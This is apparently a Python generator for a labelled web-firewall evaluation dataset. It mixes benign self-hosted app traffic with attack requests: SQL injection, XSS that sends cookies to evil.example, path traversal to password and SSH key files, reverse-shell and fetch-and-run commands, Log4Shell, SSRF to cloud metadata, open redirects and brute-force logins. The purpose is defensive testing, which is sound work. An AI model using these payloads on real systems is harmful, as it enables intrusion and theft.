import json
import random
import sys
from urllib.parse import quote

random.seed(20261022)

SAFARI = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/27.0 Safari/605.1.15"
CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
IPHONE = "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Mobile/15E148 Safari/604.1"
INFUSE = "Infuse-Library/8.5.8"
HASS = "Home Assistant/2025.11.1-18678 (Android 11; Echo Show 5)"
BROWSERS = [SAFARI, SAFARI, CHROME, IPHONE]


def browser_headers(host, ua, accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", referer=None, xhr=False):
    h = {
        "user-agent": [ua],
        "accept": ["application/json, text/plain, */*" if xhr else accept],
        "accept-language": ["en-US,en;q=0.9"],
        "accept-encoding": ["gzip, deflate, br"],
    }
    if referer:
        h["referer"] = [referer]
    if xhr:
        h["sec-fetch-mode"] = ["cors"]
        h["sec-fetch-site"] = ["same-origin"]
    else:
        h["sec-fetch-mode"] = ["navigate"]
        h["sec-fetch-dest"] = ["document"]
    return h


APPS = {
    "sonarr.example.com": {
        "pages": ["/", "/calendar", "/activity/queue", "/series/the-bear", "/settings/mediamanagement", "/system/status"],
        "api": [("GET", "/api/v3/queue/details", "includeEpisode=true"), ("GET", "/api/v3/series", ""), ("GET", "/api/v3/calendar", "unmonitored=false&start=2026-10-19T04:00:00.000Z&end=2026-10-26T04:00:00.000Z"),
                ("GET", "/api/v3/health", ""), ("POST", "/api/v3/command", ""), ("GET", "/api/v3/episode", "seriesId=142"), ("GET", "/api/v3/history", "page=1&pageSize=20&sortKey=date&sortDirection=descending")],
        "search": ("/api/v3/series/lookup", "term"),
    },
    "radarr.example.com": {
        "pages": ["/", "/movie/dune-part-two-2024", "/activity/history", "/settings/indexers"],
        "api": [("GET", "/api/v3/movie", ""), ("GET", "/api/v3/queue/status", ""), ("GET", "/api/v3/calendar", "start=2026-10-01&end=2026-10-31"), ("GET", "/api/v3/qualityprofile", "")],
        "search": ("/api/v3/movie/lookup", "term"),
    },
    "jellyfin.example.com": {
        "pages": ["/web/", "/web/index.html", "/web/main.jellyfin.bundle.js"],
        "api": [("GET", "/Items", "ParentId=b53550591e8b8f0493d3b2b17&Recursive=true&Fields=PrimaryImageAspectRatio&Limit=100"), ("GET", "/Shows/b53550591e8b8f0493d3b2b17/Seasons", "UserId=4f2a&Fields=ItemCounts"),
                ("POST", "/Sessions/Playing/Progress", ""), ("GET", "/Videos/e118eaa70f32d8db88e519052aad/stream", "Static=true&MediaSourceId=e118eaa70f32d8db88e519052aad"), ("GET", "/Users/4f2a/Items/Resume", "Limit=12&MediaTypes=Video")],
        "search": ("/Items", "searchTerm"),
    },
    "suwayomi.example.com": {
        "pages": ["/", "/library", "/manga/10516", "/browse", "/settings"],
        "api": [("POST", "/api/graphql", ""), ("GET", "/api/v1/manga/10516/chapter/2/page/9", ""), ("GET", "/api/v1/manga/10516/thumbnail", "")],
        "search": ("/api/v1/source/2499283573021220255/search", "searchTerm"),
    },
    "tdarr.example.com": {
        "pages": ["/", "/libraries", "/nodes"],
        "api": [("POST", "/api/v2/search-flow-plugins", ""), ("POST", "/api/v2/cruddb", ""), ("GET", "/api/v2/status", "")],
        "search": ("/api/v2/search-db", "string"),
    },
    "prowlarr.example.com": {
        "pages": ["/", "/search", "/indexers"],
        "api": [("GET", "/api/v1/indexer", ""), ("GET", "/api/v1/indexerstats", "")],
        "search": ("/api/v1/search", "query"),
    },
    "qbittorrent.example.com": {
        "pages": ["/"],
        "api": [("GET", "/api/v2/sync/maindata", "rid=482"), ("GET", "/api/v2/torrents/info", "filter=downloading&sort=added_on"), ("GET", "/api/v2/app/preferences", "")],
        "search": ("/api/v2/search/results", "id"),
    },
    "homeassistant.example.com": {
        "pages": ["/", "/lovelace/0", "/history"],
        "api": [("GET", "/api/websocket", ""), ("GET", "/api/states", ""), ("GET", "/auth/providers", "")],
        "search": ("/api/history/period", "filter_entity_id"),
    },
    "vaultwarden.example.com": {
        "pages": ["/", "/app/main.js"],
        "api": [("GET", "/api/sync", "excludeDomains=true"), ("POST", "/identity/connect/token", ""), ("GET", "/api/config", "")],
        "search": ("/icons/www.example.com/icon.png", ""),
    },
    "forgejo.example.com": {
        "pages": ["/", "/alice/infra", "/alice/infra/src/branch/main/k8s", "/alice/infra/pulls", "/explore/repos"],
        "api": [("GET", "/api/v1/repos/alice/infra/commits", "limit=10"), ("GET", "/alice/infra/raw/branch/main/README.md", "")],
        "search": ("/explore/repos", "q"),
    },
    "auth.example.com": {
        "pages": ["/login", "/logout"],
        "api": [("GET", "/api/auth/nginx", ""), ("POST", "/api/user/login", ""), ("GET", "/api/app", "")],
        "search": ("/login", "redirect_uri"),
    },
    "glance.example.com": {
        "pages": ["/"],
        "api": [("GET", "/api/pages/home/content/", "")],
        "search": ("/api/pages/home/content/", "q"),
    },
}

BENIGN_SEARCHES = ["the bear", "dune part two", "chainsaw man", "slime 2018", "one piece", "breaking bad s05", "pokemon", "severance", "the office us", "spirited away",
                   "linux iso", "ubuntu 26.04", "frieren", "dandadan", "blue eye samurai", "arcane"]
LOOKALIKE_SEARCHES = ["O'Brien", "Don't Look Up", "Ocean's Eleven", "Grey's Anatomy", "<3 love", "Romeo & Juliet", "select a movie", "drop dead fred", "union station",
                      "1 or 2 players", "the 39 steps", "../ (album)", "Who's Afraid of Virginia Woolf?", "script writing tips", "SQL tutorial", "cat /etc", "%20 spaces",
                      "<em>emphasis</em> guide", "where is 1=1", "rm -rf docs", "Alert! Alarm", "${budget}", "{{mustache}} templates", "C:\\Windows guide"]

SQLI = ["' OR '1'='1", "1' OR 1=1-- -", "1 UNION SELECT username,password FROM users--", "admin'--", "1; DROP TABLE users--", "1' AND SLEEP(5)-- -",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "' UNION ALL SELECT NULL,NULL,@@version#",
        "1)) OR ((1=1", "-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -", "1' WAITFOR DELAY '0:0:5'--", "x' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -"]
XSS = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(document.cookie)>", "javascript:alert(1)", "<svg/onload=alert(1)>", "'><iframe src=javascript:alert(1)>",
       "<body onload=fetch('//evil.example/'+document.cookie)>", "\"><script src=//evil.example/x.js></script>", "<details open ontoggle=alert(1)>", "%3Cscript%3Ealert(1)%3C/script%3E", "<a href=\"jav&#x09;ascript:alert(1)\">x</a>"]
TRAVERSAL = ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/shadow", "/var/www/../../etc/hosts", "..\\..\\..\\windows\\win.ini",
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fproc/self/environ", "file:///etc/passwd", "../../../../root/.ssh/id_rsa", "..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd%00.png"]
RCE = ["; cat /etc/passwd", "| id", "$(curl http://evil.example/x.sh|sh)", "`whoami`", "${jndi:ldap://evil.example/a}", "{{7*7}}{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
       "; nc -e /bin/sh 10.13.37.1 4444", "&& wget http://evil.example/bot -O /tmp/b && chmod +x /tmp/b && /tmp/b", "${@print(md5(1))}", "%0Aid%0A", "{${system('id')}}", "${T(java.lang.Runtime).getRuntime().exec('id')}"]
SCANNER_PATHS = ["/.env", "/.git/config", "/wp-login.php", "/wp-admin/setup-config.php", "/phpmyadmin/index.php", "/actuator/env", "/server-status", "/.aws/credentials", "/config.json.bak",
                 "/admin/.htpasswd", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/cgi-bin/luci/;stok=/locale", "/HNAP1/", "/boaform/admin/formLogin", "/.DS_Store", "/backup.sql",
                 "/api/swagger.json", "/owa/auth/logon.aspx", "/solr/admin/info/system", "/telescope/requests"]
SCANNER_UAS = ["sqlmap/1.9.10#stable (https://sqlmap.org)", "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007612)", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
               "masscan/1.3 (https://github.com/robertdavidgraham/masscan)", "zgrab/0.x", "python-requests/2.32.4", "Go-http-client/1.1", "curl/8.5.0", "WPScan v3.8.28 (https://wpscan.com/wordpress-security-scanner)", "Fuzz Faster U Fool v2.1.0-dev"]

rows = []
n = 0


def add(label, method, host, path, query="", headers=None, tags=()):
    global n
    n += 1
    r = {"id": f"r-{n:04d}", "label": label, "method": method, "scheme": "https", "host": host, "path": path, "protocol": "HTTP/2", "headers": headers or {}, "tags": list(tags)}
    if query:
        r["query"] = query
    rows.append(r)


hosts = list(APPS)

for host, app in APPS.items():
    for p in app["pages"]:
        add("benign", "GET", host, p, headers=browser_headers(host, random.choice(BROWSERS)), tags=["page"])
    for meth, p, q in app["api"]:
        ua = INFUSE if host.startswith("jellyfin") and random.random() < 0.5 else random.choice(BROWSERS)
        hdr = browser_headers(host, ua, referer=f"https://{host}/", xhr=True)
        if meth == "POST":
            hdr["content-type"] = ["application/json"]
        add("benign", meth, host, p, q, hdr, tags=["api"])

for i in range(26):
    host = random.choice(hosts)
    sp, key = APPS[host]["search"]
    if not key:
        continue
    add("benign", "GET", host, sp, f"{key}={quote(random.choice(BENIGN_SEARCHES))}", browser_headers(host, random.choice(BROWSERS), referer=f"https://{host}/", xhr=True), tags=["query"])

for i, s in enumerate(LOOKALIKE_SEARCHES):
    host = hosts[i % len(hosts)]
    sp, key = APPS[host]["search"]
    key = key or "q"
    add("benign", "GET", host, sp, f"{key}={quote(s)}", browser_headers(host, random.choice(BROWSERS), referer=f"https://{host}/", xhr=True), tags=["query", "lookalike"])

for ua, host, p in [(HASS, "homeassistant.example.com", "/api/states"), (HASS, "homeassistant.example.com", "/api/websocket"), (INFUSE, "jellyfin.example.com", "/Items"), ("Wget/1.21.4", "forgejo.example.com", "/alice/infra/archive/main.tar.gz"),
                    ("git/2.51.0", "forgejo.example.com", "/alice/infra.git/info/refs"), ("Prometheus/3.6.0", "glance.example.com", "/"), ("Uptime-Kuma/2.0.2", "auth.example.com", "/api/app")]:
    q = "service=git-upload-pack" if "info/refs" in p else ""
    add("benign", "GET", host, p, q, {"user-agent": [ua], "accept": ["*/*"]}, tags=["client"])


def inject(label, payloads, per=2, tags=()):
    for pl in payloads:
        for _ in range(per):
            host = random.choice(hosts)
            sp, key = APPS[host]["search"]
            key = key or "q"
            ua = random.choice(BROWSERS + [random.choice(SCANNER_UAS)])
            add(label, "GET", host, sp, f"{key}={quote(pl, safe='%')}", browser_headers(host, ua, referer=f"https://{host}/", xhr=True), tags=["query", *tags])


inject("injection", SQLI, per=2)
inject("xss", XSS, per=2)
inject("injection", RCE, per=2)
for pl in TRAVERSAL:
    for _ in range(2):
        host = random.choice(hosts)
        if random.random() < 0.5:
            add("file_access", "GET", host, "/api/v1/download", f"file={quote(pl, safe='%')}", browser_headers(host, random.choice(BROWSERS), xhr=True), tags=["query"])
        else:
            add("file_access", "GET", host, "/static/" + pl.replace("%", "%25") if "%" in pl else "/static/" + pl, headers=browser_headers(host, random.choice(BROWSERS)), tags=["path"])
for p in SCANNER_PATHS:
    host = random.choice(hosts)
    add("recon", "GET", host, p, headers={"user-agent": [random.choice(SCANNER_UAS + [CHROME])], "accept": ["*/*"]}, tags=["path"])
for ua in SCANNER_UAS:
    host = random.choice(hosts)
    add("recon", "GET", host, random.choice(["/", "/robots.txt", "/admin", "/login"]), headers={"user-agent": [ua], "accept": ["*/*"]}, tags=["ua"])
for pl in ["${jndi:ldap://evil.example/x}", "() { :; }; /bin/bash -c 'id'", "<script>alert(1)</script>", "' OR 1=1--"]:
    for host in random.sample(hosts, 3):
        h = browser_headers(host, pl if random.random() < 0.5 else CHROME)
        h["x-api-version"] = [pl]
        add("xss" if "script" in pl else "injection", "GET", host, "/", headers=h, tags=["header"])
for user in ["admin", "root", "administrator", "test", "guest", "jsmith", "user1", "support"]:
    host = random.choice(["auth.example.com", "vaultwarden.example.com", "forgejo.example.com", "homeassistant.example.com"])
    add("auth_abuse", "POST", host, "/api/user/login" if host.startswith("auth") else "/identity/connect/token" if host.startswith("vault") else "/user/login" if host.startswith("forgejo") else "/auth/login_flow",
        f"username={user}&password={quote(random.choice(['123456', 'password1', 'admin', 'Summer2026!', 'qwerty']))}", {"user-agent": [random.choice(["python-requests/2.32.4", "Go-http-client/1.1", "Hydra v9.6"])], "content-type": ["application/x-www-form-urlencoded"], "accept": ["*/*"]}, tags=["query"])

EXTRAS = [
    ("ssrf_redirect", "GET", "jellyfin.example.com", "/Items/RemoteImages/Download", "imageUrl=" + quote("http://169.254.169.254/latest/meta-data/iam/security-credentials/")),
    ("ssrf_redirect", "GET", "homeassistant.example.com", "/api/image_proxy", "url=" + quote("http://localhost:8123/api/config")),
    ("ssrf_redirect", "POST", "forgejo.example.com", "/api/v1/repos/alice/infra/hooks", "url=" + quote("http://10.0.0.1/admin")),
    ("ssrf_redirect", "GET", "glance.example.com", "/api/pages/home/content/", "feed=" + quote("file:///etc/passwd")),
    ("ssrf_redirect", "GET", "sonarr.example.com", "/api/v3/importlist/action/fetch", "url=" + quote("gopher://127.0.0.1:6379/_INFO")),
    ("ssrf_redirect", "GET", "radarr.example.com", "/api/v3/mediacover/proxy", "url=" + quote("http://metadata.google.internal/computeMetadata/v1/")),
    ("ssrf_redirect", "GET", "auth.example.com", "/login", "redirect_uri=" + quote("//evil.example.net/phish")),
    ("ssrf_redirect", "GET", "auth.example.com", "/login", "redirect_uri=" + quote("https://evil.example.net/steal")),
    ("ssrf_redirect", "GET", "vaultwarden.example.com", "/sso/callback", "next=" + quote("/\\evil.example.net")),
    ("ssrf_redirect", "GET", "forgejo.example.com", "/user/login", "redirect_to=" + quote("https://example.com.evil.example.net/")),
    ("injection", "GET", "sonarr.example.com", "/api/v3/series/lookup", "term=" + quote("bear%0d%0aSet-Cookie:%20session=attacker", safe="%")),
    ("injection", "GET", "auth.example.com", "/logout", "redirect_uri=" + quote("/%0d%0aLocation:%20https://evil.example.net", safe="%/")),
    ("injection", "GET", "suwayomi.example.com", "/api/v1/source/1/search", "searchTerm=" + quote("frieren\r\nX-Injected: 1")),
    ("injection", "GET", "auth.example.com", "/api/user/login", "username=admin&password[$ne]=x"),
    ("injection", "GET", "vaultwarden.example.com", "/api/accounts/prelogin", "email[$gt]=&kdf[$where]=sleep(5000)"),
    ("injection", "GET", "forgejo.example.com", "/api/v1/users/search", "q=" + quote('{"$regex":".*"}')),
    ("benign", "GET", "auth.example.com", "/login", "redirect_uri=" + quote("https://suwayomi.example.com/library")),
    ("benign", "GET", "auth.example.com", "/login", "redirect_uri=" + quote("https://jellyfin.example.com/web/")),
    ("benign", "GET", "forgejo.example.com", "/user/login", "redirect_to=" + quote("/alice/infra/pulls")),
    ("benign", "GET", "vaultwarden.example.com", "/sso/callback", "code=4f9a2c1e&state=Zk3pQw8x"),
    ("benign", "POST", "forgejo.example.com", "/api/v1/repos/alice/infra/hooks", "url=" + quote("https://hooks.slack.com/services/T000/B000/XXXX")),
    ("benign", "GET", "jellyfin.example.com", "/Items/RemoteImages/Download", "imageUrl=" + quote("https://image.tmdb.org/t/p/original/abc123.jpg")),
    ("benign", "GET", "glance.example.com", "/api/pages/home/content/", "feed=" + quote("https://www.reddit.com/r/selfhosted/.rss")),
    ("benign", "GET", "homeassistant.example.com", "/api/image_proxy", "url=" + quote("https://brands.home-assistant.io/hue/icon.png")),
    ("benign", "GET", "sonarr.example.com", "/api/v3/importlist/action/fetch", "url=" + quote("https://api.trakt.tv/users/alice/watchlist")),
    ("benign", "GET", "radarr.example.com", "/api/v3/mediacover/proxy", "url=" + quote("https://image.tmdb.org/t/p/w500/xyz.jpg")),
    ("benign", "GET", "auth.example.com", "/logout", "redirect_uri=" + quote("https://auth.example.com/login")),
    ("benign", "GET", "suwayomi.example.com", "/api/v1/source/1/search", "searchTerm=" + quote("http://example.com in anime")),
]
for i, (label, method, host, path, query) in enumerate(EXTRAS, 1):
    url_param = any(k in query for k in ("url", "redirect", "next=", "feed=", "imageUrl"))
    rows.append({"id": f"x-{i:03d}", "label": label, "method": method, "scheme": "https", "host": host, "path": path, "query": query, "protocol": "HTTP/2",
                 "headers": {"user-agent": [SAFARI], "accept": ["application/json, text/plain, */*"], "accept-language": ["en-US,en;q=0.9"], "referer": [f"https://{host}/"]},
                 "tags": ["extra", "url-param" if url_param else "query"]})

out = sys.argv[1]
with open(out, "w") as f:
    f.write(json.dumps({"decision_waf_eval_dataset": 1, "name": "selfhosted-2026-10b", "description": "Semi-synthetic self-hosted traffic: request shapes from common self-hosted apps, lookalike benign queries, common attack payloads and scanner probes. Headers only (lite mode). Includes hand-written SSRF, open-redirect, CRLF and NoSQL requests and benign URL-parameter lookalikes."}) + "\n")
    for r in rows:
        f.write(json.dumps(r) + "\n")
labels = {}
for r in rows:
    labels[r["label"]] = labels.get(r["label"], 0) + 1
print(len(rows), labels, "lookalikes:", sum("lookalike" in r["tags"] for r in rows))
